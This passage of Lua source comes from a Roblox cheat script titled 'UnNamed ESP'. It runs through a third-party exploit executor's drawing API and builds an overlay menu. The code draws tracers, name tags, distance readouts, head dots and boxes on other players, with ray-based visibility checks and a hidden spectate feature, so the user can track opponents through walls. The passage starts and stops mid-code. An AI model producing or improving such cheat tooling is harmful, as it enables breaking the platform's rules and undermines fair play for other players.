		self.UpdatePosition = nil;
		self.HandleInput = nil;
		Connections:DisconnectAll(); -- scuffed tbh
	end

	Connections:Listen(UserInputService.InputBegan, function(Input, Process)
		self:HandleInput(Input, Process, 'Began');
	end);
	Connections:Listen(UserInputService.InputChanged, function(Input, Process)
		if Input.UserInputType.Name == 'MouseMovement' then
			local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);
			local Cursor = self.Drawings['Triangle-Cursor'] {
				Filled = true;
				Color = Color3.new(0.9, 0.9, 0.9);
				PointA = MousePosition + V2New(0, 0);
				PointB = MousePosition + V2New(12, 14);
				PointC = MousePosition + V2New(0, 18);
				Thickness = 0;
			};
		end
		self:HandleInput(Input, Process, 'Changed');
	end);
	Connections:Listen(UserInputService.InputEnded, function(Input, Process)
		self:HandleInput(Input, Process, 'Ended');
		
		if Input.UserInputType.Name == 'MouseButton1' then
			self.MouseHeld = false
		end
	end)

	ColorPicker.Loading = false

    self.Drawings = Drawings

    return self
end

function SubMenu:Show(Position, Title, Options)
	self.Open = true;

	local Visible = true;
	local BasePosition = Position;
	local BaseSize = V2New(200, 140);
	local End = BasePosition + BaseSize;

	self.Bounds = { BasePosition.X, BasePosition.Y, End.X, End.Y };

	delay(0.025, function()
		if not self.Open then return; end

		Menu:AddMenuInstance('Sub-Main', 'Square', {
			Size		= BaseSize;
			Position	= BasePosition;
			Filled		= false;
			Color		= Colors.Primary.Main;
			Thickness	= 3;
			Visible		= Visible;
		});
	end);
	Menu:AddMenuInstance('Sub-TopBar', 'Square', {
		Position	= BasePosition;
		Size		= V2New(BaseSize.X, 10);
		Color		= Colors.Primary.Dark;
		Filled		= true;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-TopBarTwo', 'Square', {
		Position 	= BasePosition + V2New(0, 10);
		Size		= V2New(BaseSize.X, 20);
		Color		= Colors.Primary.Main;
		Filled		= true;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-TopBarText', 'Text', {
		Size 		= 20;
		Position	= shared.MenuDrawingData.Instances['Sub-TopBarTwo'].Position + V2New(15, -3);
		Text		= Title or '';
		Color		= Colors.Secondary.Light;
		Visible		= Visible;
	});
	Menu:AddMenuInstance('Sub-Filling', 'Square', {
		Size		= BaseSize - V2New(0, 30);
		Position	= BasePosition + V2New(0, 30);
		Filled		= true;
		Color		= Colors.Secondary.Main;
		Transparency= .75;
		Visible		= Visible;
	});

	if Options then
		for Index, Option in pairs(Options) do -- currently only supports color and button(but color is a button so), planning on fully rewriting or something
			local function GetName(Name) return ('Sub-%s.%d'):format(Name, Index) end
			local Position = shared.MenuDrawingData.Instances['Sub-Filling'].Position + V2New(20, Index * 25 - 10);
			-- local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(30, v.Index * 25 - 10);

			if Option.Type == 'Color' then
				local ColorPreview = Menu:AddMenuInstance(GetName'ColorPreview', 'Circle', {
					Position = Position;
					Color = Option.Color;
					Radius = IsSynapse and 10 or 10;
					NumSides = 10;
					Filled = true;
					Visible = true;
				});
				local Text = Menu:AddMenuInstance(GetName'Text', 'Text', {
					Text = Option.Text;
					Position = ColorPreview.Position + V2New(15, -8);
					Size = 16;
					Color = Colors.Primary.Dark;
					Visible = true;
				});
				UIButtons[#UIButtons + 1] = {
					FromSubMenu = true;
					Option = function() return Option.Function(ColorPreview, BasePosition + V2New(BaseSize.X, 0)) end;
					Instance = Menu:AddMenuInstance(Format('%s_Hitbox', GetName'Button'), 'Square', {
						Position	= Position - V2New(20, 12);
						Size		= V2New(BaseSize.X, 25);
						Visible		= false;
					});
				};
			elseif Option.Type == 'Button' then
				UIButtons[#UIButtons + 1] = {
					FromSubMenu = true;
					Option = Option.Function;
					Instance = Menu:AddMenuInstance(Format('%s_Hitbox', GetName'Button'), 'Square', {
						Size		= V2New(BaseSize.X, 20) - V2New(20, 0);
						Visible		= true;
						Transparency= .5;
						Position	= Position - V2New(10, 10);
						Color		= Colors.Secondary.Light;
						Filled		= true;
					});
				};
				local Text		= Menu:AddMenuInstance(Format('%s_Text', GetName'Text'), 'Text', {
					Text		= Option.Text;
					Size		= 18;
					Position	= Position + V2New(5, -10);
					Visible		= true;
					Color		= Colors.Primary.Dark;
				});
			end
		end
	end
end

function SubMenu:Hide()
	self.Open = false;

	for i, v in pairs(shared.MenuDrawingData.Instances) do
		if i:sub(1, 3) == 'Sub' then
			v.Visible = false;

			if i:sub(4, 4) == ':' then -- ';' = Temporary so remove
				v:Remove();
				shared.MenuDrawingData.Instance[i] = nil;
			end
		end
	end

	for i, Button in pairs(UIButtons) do
		if Button.FromSubMenu then
			UIButtons[i] = nil;
		end
	end

	spawn(function() -- stupid bug happens if i dont use this
		for i = 1, 10 do
			if shared.CurrentColorPicker then -- dont know why 'CurrentColorPicker' isnt a variable in this
				shared.CurrentColorPicker:Dispose();
			end
			wait(0.1);
		end
	end)

	CurrentColorPicker = nil;
end

function CreateMenu(NewPosition) -- Create Menu
	MenuLoaded = false;
	UIButtons  = {};
	Sliders	   = {};

	local BaseSize = V2New(300, 625);
	local BasePosition = NewPosition or V2New(Camera.ViewportSize.X / 8 - (BaseSize.X / 2), Camera.ViewportSize.Y / 2 - (BaseSize.Y / 2));

	BasePosition = V2New(math.clamp(BasePosition.X, 0, Camera.ViewportSize.X), math.clamp(BasePosition.Y, 0, Camera.ViewportSize.Y));

	Menu:AddMenuInstance('CrosshairX', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 1;
	});
	Menu:AddMenuInstance('CrosshairY', 'Line', {
		Visible			= false;
		Color			= Color3.new(0, 0, 1);
		Transparency	= 1;
		Thickness		= 1;
	});

	delay(.025, function() -- since zindex doesnt exist
		Menu:AddMenuInstance('Main', 'Square', {
			Size		= BaseSize;
			Position	= BasePosition;
			Filled		= false;
			Color		= Colors.Primary.Dark;
			Thickness	= 3;
			Visible		= true;
		});
	end);
	Menu:AddMenuInstance('TopBar', 'Square', {
		Position	= BasePosition;
		Size		= V2New(BaseSize.X, 15);
		Color		= Colors.Primary.Dark;
		Filled		= true;
		Visible		= true;
	});
	Menu:AddMenuInstance('TopBarTwo', 'Square', {
		Position 	= BasePosition + V2New(0, 15);
		Size		= V2New(BaseSize.X, 45);
		Color		= Colors.Primary.Dark;
		Filled		= true;
		Visible		= true;
	});
	Menu:AddMenuInstance('TopBarText', 'Text', {
		Size 		= 25;
		Position	= shared.MenuDrawingData.Instances.TopBarTwo.Position + V2New(25, 10);
		Text		= 'UnNamed ESP - UI Edit';
		Color		= Colors.Secondary.Light;
		Visible		= true;
		Transparency= 1; -- proto outline fix
		Outline 	= true;
		OutlineOpacity = 0.5;
	});
	Menu:AddMenuInstance('Filling', 'Square', {
		Size		= BaseSize - V2New(0, 60);
		Position	= BasePosition + V2New(0, 60);
		Filled		= true;
		Color		= Color3.new(0,0,0);
		Transparency= 0.35;
		Visible		= true;
	});

	local CPos = 0;

	GetTableData(Options)(function(i, v)
		if typeof(v.Value) == 'boolean' and not IsStringEmpty(v.Text) and v.Text ~= nil then
			CPos 				= CPos + 25;
			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(30, v.Index * 25 - 10);
			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Position	= BasePosition - V2New(30, 15);
					Size		= BaseSize;
					Visible		= false;
				});
			};
			Menu:AddMenuInstance(Format('%s_OuterCircle', v.Name), 'Circle', {
				Radius		= 10;
				Position	= BasePosition;
				Color		= Color3.new(0.3, 0.3, 0.3);
				Filled		= true;
				Visible		= true;
			});
			Menu:AddMenuInstance(Format('%s_InnerCircle', v.Name), 'Circle', {
				Radius		= 7;
				Position	= BasePosition;
				Color		= Color3.new(.2, .2, .2);
				Filled		= true;
				Visible		= v.Value;
			});
			Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Colors.Secondary.Light;
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});
		end
	end)
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'number' then
			CPos 				= CPos + 25;

			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos - 10);

			local Line			= Menu:AddMenuInstance(Format('%s_SliderLine', v.Name), 'Square', {
				Transparency	= 1;
				Color			= Color3.new(0, 0, 0);
				-- Thickness		= 3;
				Filled			= true;
				Visible			= true;
				Position 		= BasePosition + V2New(15, -5);
				Size 			= BaseSize - V2New(30, 10);
				Transparency	= 0.5;
			});
			local Slider		= Menu:AddMenuInstance(Format('%s_Slider', v.Name), 'Square', {
				Visible			= true;
				Filled			= true;
				Color			= Color3.new(1, 0, 0);
				Size			= V2New(5, Line.Size.Y);
				Transparency	= 0.5;
			});
			local Text			= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text			= v.Text;
				Size			= 20;
				Center			= true;
				Transparency	= 1;
				Outline			= true;
				OutlineOpacity  = 0.5;
				Visible			= true;
				Color			= Colors.White;
			}); Text.Position	= Line.Position + (Line.Size / 2) - V2New(0, Text.TextBounds.Y / 1.75);
			local AMT			= Menu:AddMenuInstance(Format('%s_AmountText', v.Name), 'Text', {
				Text			= tostring(v.Value);
				Size			= 22;
				Center			= true;
				Transparency	= 1;
				Outline			= true;
				OutlineOpacity  = 0.5;
				Visible			= true;
				Color			= Colors.White;
				Position		= Text.Position;
			});

			local CSlider = {Slider = Slider; Line = Line; Min = v.AllArgs[4]; Max = v.AllArgs[5]; Option = v};
			local Dummy = Instance.new'NumberValue';

			Dummy:GetPropertyChangedSignal'Value':Connect(function()
				Text.Transparency = Dummy.Value;
				-- Text.OutlineTransparency = 1 - Dummy.Value;
				AMT.Transparency = 1 - Dummy.Value;
			end);

			Dummy.Value = 1;

			function CSlider:ShowValue(Bool)
				self.ShowingValue = Bool;

				TweenService:Create(Dummy, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Value = Bool and 0 or 1 }):Play();
			end

			Sliders[#Sliders + 1] = CSlider;

			-- local Percent = (v.Value / CSlider.Max) * 100;
			-- local Size = math.abs(Line.From.X - Line.To.X);
			-- local Value = Size * (Percent / 100); -- this shit's inaccurate but fuck it i'm not even gonna bother fixing it

			Slider.Position = Line.Position + V2New(35, 0);
			
			v.BaseSize = BaseSize;
			v.BasePosition = BasePosition;
			-- AMT.Position = BasePosition + V2New(BaseSize.X - AMT.TextBounds.X - 10, -10)
		end
	end)
	local FirstItem = false;
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'EnumItem' then
			CPos 				= CPos + (not FirstItem and 30 or 25);
			FirstItem			= true;

			local BaseSize		= V2New(BaseSize.X, FirstItem and 30 or 25);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos - 10);

			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Size		= V2New(BaseSize.X, 20) - V2New(30, 0);
					Visible		= true;
					Transparency= .5;
					Position	= BasePosition + V2New(15, -10);
					Color		= Color3.new(0, 0, 0);
					Filled		= true;
				});
			};
			local Text		= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Color3.new(0, 1, 0);
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});
			local BindText	= Menu:AddMenuInstance(Format('%s_BindText', v.Name), 'Text', {
				Text		= tostring(v.Value):match'%w+%.%w+%.(.+)';
				Size		= 20;
				Position	= BasePosition;
				Visible		= true;
				Color		= Color3.new(0, 1, 0);
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});

			Options[i].BaseSize = BaseSize;
			Options[i].BasePosition = BasePosition;
			BindText.Position = BasePosition + V2New(BaseSize.X - BindText.TextBounds.X - 20, -10);
		end
	end)
	GetTableData(Options)(function(i, v) -- just to make sure certain things are drawn before or after others, too lazy to actually sort table
		if typeof(v.Value) == 'function' then
			local BaseSize		= V2New(BaseSize.X, 30);
			local BasePosition	= shared.MenuDrawingData.Instances.Filling.Position + V2New(0, CPos + (25 * v.AllArgs[4]) - 35);

			UIButtons[#UIButtons + 1] = {
				Option = v;
				Instance = Menu:AddMenuInstance(Format('%s_Hitbox', v.Name), 'Square', {
					Size		= V2New(BaseSize.X, 20) - V2New(30, 0);
					Visible		= true;
					Transparency= .5;
					Position	= BasePosition + V2New(15, -10);
					Color		= Color3.new(0, 0, 0);
					Filled		= true;
				});
			};
			local Text		= Menu:AddMenuInstance(Format('%s_Text', v.Name), 'Text', {
				Text		= v.Text;
				Size		= 20;
				Position	= BasePosition + V2New(20, -10);
				Visible		= true;
				Color		= Color3.new(0, 1, 0);
				Transparency= 1;
				Outline		= true;
				OutlineOpacity = 0.5;
			});

			-- BindText.Position = BasePosition + V2New(BaseSize.X - BindText.TextBounds.X - 10, -10);
		end
	end)

	delay(.1, function()
		MenuLoaded = true;
	end);

	-- this has to be at the bottom cuz proto drawing api doesnt have zindex :triumph:	
	Menu:AddMenuInstance('Cursor1', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
	Menu:AddMenuInstance('Cursor2', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
	Menu:AddMenuInstance('Cursor3', 'Line', {
		Visible			= false;
		Color			= Color3.new(1, 0, 0);
		Transparency	= 1;
		Thickness		= 2;
	});
end

CreateMenu();
delay(0.1, function()
	SubMenu:Show(V2New()); -- Create the submenu
	SubMenu:Hide();
end);

shared.UESP_InputChangedCon = UserInputService.InputChanged:Connect(function(input)
	if input.UserInputType.Name == 'MouseMovement' and Options.MenuOpen.Value then
		for i, v in pairs(Sliders) do
			local Values = {
				v.Line.Position.X;
				v.Line.Position.Y;
				v.Line.Position.X + v.Line.Size.X;
				v.Line.Position.Y + v.Line.Size.Y;
			};
			if MouseHoveringOver(Values) then
				v:ShowValue(true);
			else
				if not MouseHeld then v:ShowValue(false); end
			end
		end
	end
end)
shared.UESP_InputBeganCon = UserInputService.InputBegan:Connect(function(input)
	if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
		MouseHeld = true;
		local Bar = Menu:GetInstance'TopBar';
		local Values = {
			Bar.Position.X;
			Bar.Position.Y;
			Bar.Position.X + Bar.Size.X;
			Bar.Position.Y + Bar.Size.Y;
		}
		if MouseHoveringOver(Values) then
			DraggingUI = true;
			DragOffset = Menu:GetInstance'Main'.Position - GetMouseLocation();
		else
			for i, v in pairs(Sliders) do
				local Values = {
					v.Line.Position.X;
					v.Line.Position.Y;
					v.Line.Position.X + v.Line.Size.X;
					v.Line.Position.Y + v.Line.Size.Y;
					-- v.Line.From.X	- (v.Slider.Radius);
					-- v.Line.From.Y	- (v.Slider.Radius);
					-- v.Line.To.X		+ (v.Slider.Radius);
					-- v.Line.To.Y		+ (v.Slider.Radius);
				};
				if MouseHoveringOver(Values) then
					DraggingWhat = v;
					Dragging = true;
					break
				end
			end

			if not Dragging then
				local Values = {
					TracerPosition.X - 10;
					TracerPosition.Y - 10;
					TracerPosition.X + 10;
					TracerPosition.Y + 10;
				};
				if MouseHoveringOver(Values) then
					DragTracerPosition = true;
				end
			end
		end
	end
end)
shared.UESP_InputEndedCon = UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType.Name == 'MouseButton1' and Options.MenuOpen.Value then
		MouseHeld = false;
		DragTracerPosition = false;
		local IgnoreOtherInput = false;

		if SubMenu.Open and not MouseHoveringOver(SubMenu.Bounds) then
			if CurrentColorPicker and IsMouseOverDrawing(CurrentColorPicker.Drawings['Square-Background']()) then IgnoreOtherInput = true; end
			if not IgnoreOtherInput then SubMenu:Hide() end
		end

		if not IgnoreOtherInput then
			for i, v in pairs(UIButtons) do
				if SubMenu.Open and MouseHoveringOver(SubMenu.Bounds) and not v.FromSubMenu then continue end

				local Values = {
					v.Instance.Position.X;
					v.Instance.Position.Y;
					v.Instance.Position.X + v.Instance.Size.X;
					v.Instance.Position.Y + v.Instance.Size.Y;
				};
				if MouseHoveringOver(Values) then
					v.Option();
					IgnoreOtherInput = true;
					break -- prevent clicking 2 options
				end
			end
			for i, v in pairs(Sliders) do
				if IgnoreOtherInput then break end

				local Values = {
					v.Line.Position.X;
					v.Line.Position.Y;
					v.Line.Position.X + v.Line.Size.X;
					v.Line.Position.Y + v.Line.Size.Y;
				};
				if not MouseHoveringOver(Values) then
					v:ShowValue(false);
				end
			end
		end
	elseif input.UserInputType.Name == 'MouseButton2' and Options.MenuOpen.Value and not DragTracerPosition then
		local Values = {
			TracerPosition.X - 10;
			TracerPosition.Y - 10;
			TracerPosition.X + 10;
			TracerPosition.Y + 10;
		}
		if MouseHoveringOver(Values) then
			DragTracerPosition = false;
			TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
		end
	elseif input.UserInputType.Name == 'Keyboard' then
		if Binding then
			BindedKey = input.KeyCode;
			Binding = false;
		elseif input.KeyCode == Options.MenuKey.Value or (input.KeyCode == Enum.KeyCode.Home and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl)) then
			Options.MenuOpen();
		elseif input.KeyCode == Options.ToggleKey.Value then
			Options.Enabled();
		elseif input.KeyCode.Name == 'F1' and UserInputService:IsMouseButtonPressed(1) and shared.am_ic3 then -- hehe hiden spectate feature cuz why not
			local HD, LPlayer, LCharacter = 0.95;

			for i, Player in pairs(Players:GetPlayers()) do
				local Character = GetCharacter(Player);

				if Player ~= LocalPlayer and Player ~= Spectating and Character and Character:FindFirstChild'HumanoidRootPart' then
					local Head = Character:FindFirstChild'Head';
					local Humanoid = Character:FindFirstChildOfClass'Humanoid';
					
					if Head then
						local Distance  = (Camera.CFrame.Position - Head.Position).Magnitude;
						
						if Distance > Options.MaxDistance.Value then continue; end

						local Direction = -(Camera.CFrame.Position - Mouse.Hit.Position).unit;
						local Relative  = Character.Head.Position - Camera.CFrame.Position;
						local Unit      = Relative.unit;

						local DP = Direction:Dot(Unit);

						if DP > HD then
							HD = DP;
							LPlayer = Player;
							LCharacter = Character;
						end
					end
				end
			end
			
			if LPlayer and LPlayer ~= Spectating and LCharacter then
				Camera.CameraSubject = LCharacter.Head;
				Spectating = LPlayer;
			else
				if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass'Humanoid' then
					Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass'Humanoid';
					Spectating = nil;
				end
			end
		end
	end
end)

local function CameraCon() -- unnamed esp v1 sucks
	workspace.CurrentCamera:GetPropertyChangedSignal'ViewportSize':Connect(function()
		TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
	end);
end

CameraCon();

local function ToggleMenu()
	if Options.MenuOpen.Value then
		GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
			if OldData[v] then
				pcall(Set, v, 'Visible', true);
			end
		end)
	else
		GetTableData(shared.MenuDrawingData.Instances)(function(i, v)
			OldData[v] = v.Visible;
			if v.Visible then
				pcall(Set, v, 'Visible', false);
			end
		end)
	end
end

local LastRayIgnoreUpdate, RayIgnoreList = 0, {}

local function CheckRay(Instance, Distance, Position, Unit)
	local Pass = true;
	local Model = Instance;

	if Distance > 999 then return false; end

	if Instance.ClassName == 'Player' then
		Model = GetCharacter(Instance);
	end

	if not Model then
		Model = Instance.Parent;

		if Model.Parent == workspace then
			Model = Instance;
		end
	end

	if not Model then return false end

	local _Ray = Ray.new(Position, Unit * Distance)

	if tick() - LastRayIgnoreUpdate > 3 then
		LastRayIgnoreUpdate = tick()

		table.clear(RayIgnoreList)

		table.insert(RayIgnoreList, LocalPlayer.Character)
		table.insert(RayIgnoreList, Camera)
		
		if Mouse.TargetFilter then table.insert(RayIgnoreList, Mouse.TargetFilter) end

		if #IgnoreList > 64 then
			while #IgnoreList > 64 do
				table.remove(IgnoreList, 1)
			end
		end

		for i, v in pairs(IgnoreList) do table.insert(RayIgnoreList, v) end
	end

	local Hit = workspace:FindPartOnRayWithIgnoreList(_Ray, RayIgnoreList)

	if Hit and not Hit:IsDescendantOf(Model) then
		Pass = false;
		if Hit.Transparency >= .3 or not Hit.CanCollide and Hit.ClassName ~= Terrain then -- Detect invisible walls
			table.insert(IgnoreList, Hit)
			-- IgnoreList[#IgnoreList + 1] = Hit;
		end
	end

	return Pass;
end

local function CheckTeam(Player)
	if Player.Neutral and LocalPlayer.Neutral then return true; end
	return Player.TeamColor == LocalPlayer.TeamColor;
end

local CustomTeam = CustomTeams[game.PlaceId];

if CustomTeam ~= nil then
	if CustomTeam.Initialize then ypcall(CustomTeam.Initialize) end

	CheckTeam = CustomTeam.CheckTeam;
end

local function CheckPlayer(Player, Character)
	if not Options.Enabled.Value then return false end

	local Pass = true;
	local Distance = 0;

	if Player ~= LocalPlayer and Character then
		if not Options.ShowTeam.Value and CheckTeam(Player) then
			Pass = false;
		end

		local Head = Character:FindFirstChild'Head';

		if Pass and Character and Head then
			Distance = (Camera.CFrame.Position - Head.Position).Magnitude;
			if Options.VisCheck.Value then
				Pass = CheckRay(Player, Distance, Camera.CFrame.Position, (Head.Position - Camera.CFrame.Position).unit);
			end
			if Distance > Options.MaxDistance.Value then
				Pass = false;
			end
		end
	else
		Pass = false;
	end

	return Pass, Distance;
end

local function CheckDistance(Instance)
	if not Options.Enabled.Value then return false end

	local Pass = true;
	local Distance = 0;

	if Instance ~= nil then
		Distance = (Camera.CFrame.Position - Instance.Position).Magnitude;
		if Options.VisCheck.Value then
			Pass = CheckRay(Instance, Distance, Camera.CFrame.Position, (Instance.Position - Camera.CFrame.Position).unit);
		end
		if Distance > Options.MaxDistance.Value then
			Pass = false;
		end
	else
		Pass = false;
	end

	return Pass, Distance;
end

local function UpdatePlayerData()
	if (tick() - LastRefresh) > (Options.RefreshRate.Value / 1000) then
		LastRefresh = tick();
		if CustomESP and Options.Enabled.Value then
			local a, b = pcall(CustomESP);
		end
		for i, v in pairs(RenderList.Instances) do
			if v.Instance ~= nil and v.Instance.Parent ~= nil and v.Instance:IsA'BasePart' then
				local Data = shared.InstanceData[v.Instance:GetDebugId()] or { Instances = {}; DontDelete = true };

				Data.Instance = v.Instance;

				Data.Instances['OutlineTracer'] = Data.Instances['OutlineTracer'] or NewDrawing'Line'{
					Transparency	= 0.75;
					Thickness		= 5;
					Color 			= Color3.new(0.1, 0.1, 0.1);
				}
				Data.Instances['Tracer'] = Data.Instances['Tracer'] or NewDrawing'Line'{
					Transparency	= 1;
					Thickness		= 2;
				}
				Data.Instances['NameTag'] = Data.Instances['NameTag'] or NewDrawing'Text'{
					Size			= Options.TextSize.Value;
					Center			= true;
					Outline			= Options.TextOutline.Value;
					Visible			= true;
				};
				Data.Instances['DistanceTag'] = Data.Instances['DistanceTag'] or NewDrawing'Text'{
					Size			= Options.TextSize.Value - 1;
					Center			= true;
					Outline			= Options.TextOutline.Value;
					Visible			= true;
				};

				local NameTag		= Data.Instances['NameTag'];
				local DistanceTag	= Data.Instances['DistanceTag'];
				local Tracer		= Data.Instances['Tracer'];
				local OutlineTracer	= Data.Instances['OutlineTracer'];

				local Pass, Distance = CheckDistance(v.Instance);

				if Pass then
					local ScreenPosition, Vis = WorldToViewport(v.Instance.Position);
					local Color = v.Color;
					local OPos = Camera.CFrame:pointToObjectSpace(v.Instance.Position);
					
					if ScreenPosition.Z < 0 then
						local AT = math.atan2(OPos.Y, OPos.X) + math.pi;
						OPos = CFrame.Angles(0, 0, AT):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(V3New(0, 0, -1))));
					end
					
					local Position = WorldToViewport(Camera.CFrame:pointToWorldSpace(OPos));

					if Options.ShowTracers.Value then
						Tracer.Transparency = math.clamp(Distance / 200, 0.45, 0.8);
						Tracer.Visible	= true;
						Tracer.From		= TracerPosition;
						Tracer.To		= V2New(Position.X, Position.Y);
						Tracer.Color	= Color;
						OutlineTracer.Visible = true;
						OutlineTracer.Transparency = Tracer.Transparency - 0.1;
						OutlineTracer.From = Tracer.From;
						OutlineTracer.To = Tracer.To;
						OutlineTracer.Color	= Color3.new(0.1, 0.1, 0.1);
					else
						Tracer.Visible = false;
						OutlineTracer.Visible = false;
					end

					if ScreenPosition.Z > 0 then
						local ScreenPositionUpper = ScreenPosition;
						
						if Options.ShowName.Value then
							LocalPlayer.NameDisplayDistance = 0;
							NameTag.Visible		= true;
							NameTag.Text		= v.Text;
							NameTag.Size		= Options.TextSize.Value;
							NameTag.Outline		= Options.TextOutline.Value;
							NameTag.Position	= V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y);
							NameTag.Color		= Color;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end
						else
							LocalPlayer.NameDisplayDistance = 100;
							NameTag.Visible = false;
						end
						if Options.ShowDistance.Value or Options.ShowHealth.Value then
							DistanceTag.Visible		= true;
							DistanceTag.Size		= Options.TextSize.Value - 1;
							DistanceTag.Outline		= Options.TextOutline.Value;
							DistanceTag.Color		= Color3.new(1, 1, 1);
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end

							local Str = '';

							if Options.ShowDistance.Value then
								Str = Str .. Format('[%d] ', Distance);
							end

							DistanceTag.Text = Str;
							DistanceTag.Position = V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y) + V2New(0, NameTag.TextBounds.Y);
						else
							DistanceTag.Visible = false;
						end
					else
						NameTag.Visible			= false;
						DistanceTag.Visible		= false;
					end
				else
					NameTag.Visible			= false;
					DistanceTag.Visible		= false;
					Tracer.Visible			= false;
					OutlineTracer.Visible	= false;
				end

				Data.Instances['NameTag'] 		= NameTag;
				Data.Instances['DistanceTag']	= DistanceTag;
				Data.Instances['Tracer']		= Tracer;
				Data.Instances['OutlineTracer']	= OutlineTracer;

				shared.InstanceData[v.Instance:GetDebugId()] = Data;
			end
		end
		for i, v in pairs(Players:GetPlayers()) do
			local Data = shared.InstanceData[v.Name] or { Instances = {}; };

			Data.Instances['Box'] = Data.Instances['Box'] or LineBox:Create{Thickness = 4};
			Data.Instances['OutlineTracer'] = Data.Instances['OutlineTracer'] or NewDrawing'Line'{
				Transparency	= 1;
				Thickness		= 3;
				Color			= Color3.new(0.1, 0.1, 0.1);
			}
			Data.Instances['Tracer'] = Data.Instances['Tracer'] or NewDrawing'Line'{
				Transparency	= 1;
				Thickness		= 1;
			}
			Data.Instances['HeadDot'] = Data.Instances['HeadDot'] or NewDrawing'Circle'{
				Filled			= true;
				NumSides		= 30;
			}
			Data.Instances['NameTag'] = Data.Instances['NameTag'] or NewDrawing'Text'{
				Size			= Options.TextSize.Value;
				Center			= true;
				Outline			= Options.TextOutline.Value;
				OutlineOpacity	= 1;
				Visible			= true;
			};
			Data.Instances['DistanceHealthTag'] = Data.Instances['DistanceHealthTag'] or NewDrawing'Text'{
				Size			= Options.TextSize.Value - 1;
				Center			= true;
				Outline			= Options.TextOutline.Value;
				OutlineOpacity	= 1;
				Visible			= true;
			};

			local NameTag		= Data.Instances['NameTag'];
			local DistanceTag	= Data.Instances['DistanceHealthTag'];
			local Tracer		= Data.Instances['Tracer'];
			local OutlineTracer	= Data.Instances['OutlineTracer'];
			local HeadDot		= Data.Instances['HeadDot'];
			local Box			= Data.Instances['Box'];

			local Character = GetCharacter(v);
			local Pass, Distance = CheckPlayer(v, Character);

			if Pass and Character then
				local Humanoid = Character:FindFirstChildOfClass'Humanoid';
				local Head = Character:FindFirstChild'Head';
				local HumanoidRootPart = Character:FindFirstChild(CustomRootPartName or 'HumanoidRootPart')

				local Dead = (Humanoid and Humanoid:GetState().Name == 'Dead')
				if type(GetAliveState) == 'function' then
					Dead = (not GetAliveState(v, Character))
				end

				if Character ~= nil and Head and HumanoidRootPart and not Dead then
					local ScreenPosition, Vis = WorldToViewport(Head.Position);
					local Color = Rainbow and Color3.fromHSV(tick() * 128 % 255/255, 1, 1) or (CheckTeam(v) and TeamColor or EnemyColor); Color = Options.ShowTeamColor.Value and v.TeamColor.Color or Color;
					local OPos = Camera.CFrame:pointToObjectSpace(Head.Position);
					
					if ScreenPosition.Z < 0 then
						local AT = math.atan2(OPos.Y, OPos.X) + math.pi;
						OPos = CFrame.Angles(0, 0, AT):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(V3New(0, 0, -1))));
					end
					
					local Position = WorldToViewport(Camera.CFrame:pointToWorldSpace(OPos));

					if Options.ShowTracers.Value then
						if TracerPosition.X >= Camera.ViewportSize.X or TracerPosition.Y >= Camera.ViewportSize.Y or TracerPosition.X < 0 or TracerPosition.Y < 0 then
							TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
						end

						Tracer.Visible	= true;
						Tracer.Transparency = math.clamp(1 - (Distance / 200), 0.25, 0.75);
						Tracer.From		= TracerPosition;
						Tracer.To		= V2New(Position.X, Position.Y);
						Tracer.Color	= Color;
						OutlineTracer.From = Tracer.From;
						OutlineTracer.To = Tracer.To;
